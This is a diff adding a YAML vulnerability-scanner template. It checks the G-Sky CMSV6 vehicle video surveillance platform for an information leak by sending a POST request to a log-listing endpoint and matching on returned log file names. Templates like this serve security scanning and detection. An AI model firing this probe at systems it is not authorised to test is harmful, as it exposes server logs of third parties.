@@ -1,0 +1,29 @@
+id: poc-yaml-g-sky-cmsv6-selectdevaction-loadserverloggerfile-info-leak
+info:
+  name: 通天星CMS V6车载视频监控平台 SelectDevAction_loadServerLoggerFile 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: information-disclosure
+http:
+  - raw:
+      - |
+        POST /808gps/LoggerManagement/SelectDevAction_loadServerLoggerFile.action HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        page=1&rp=15&query=&qtype=&pagin=%257B%2522currentPage%2522%253A1%252C%2522pageRecords%2522%253A15%257D
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"fileName":'
+          - '.log'
+          - '"address":'
+      - type: word
+        part: header
+        words:
+          - "application/json"
